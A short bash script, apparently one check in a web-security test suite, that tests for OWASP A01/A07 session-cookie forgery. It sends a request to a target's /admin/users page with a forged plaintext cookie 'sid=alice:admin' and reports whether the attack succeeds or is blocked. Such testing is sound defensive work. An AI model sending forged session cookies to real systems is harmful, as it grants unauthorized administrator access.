#!/usr/bin/env bash
# OWASP A01/A07 - falsificacion de cookie de sesion (escalada de privilegios)
source "$(dirname "$0")/lib.sh" "$@"

out="$EVIDENCE_DIR/05-admin-forjado.html"
code=$(curl_ -o "$out" -w '%{http_code}' -H 'Cookie: sid=alice:admin' "$target/admin/users")
say "GET /admin/users con cookie forjada 'sid=alice:admin' -> HTTP $code"

if [ "$code" = "200" ] && grep -q 'admin123\|alice' "$out"; then
    say "ATAQUE EXITOSO: una cookie en texto plano otorgo el rol de administrador"
    say "evidence=$out"
    exit 0
fi
if [ "$code" = "403" ] || [ "$code" = "303" ]; then
    say "BLOQUEADO: la sesion firmada no valida y el rol se revalida en el servidor"
    say "evidence=$out"
    exit 1
fi
say "RESULTADO INESPERADO (HTTP $code)"
exit 2
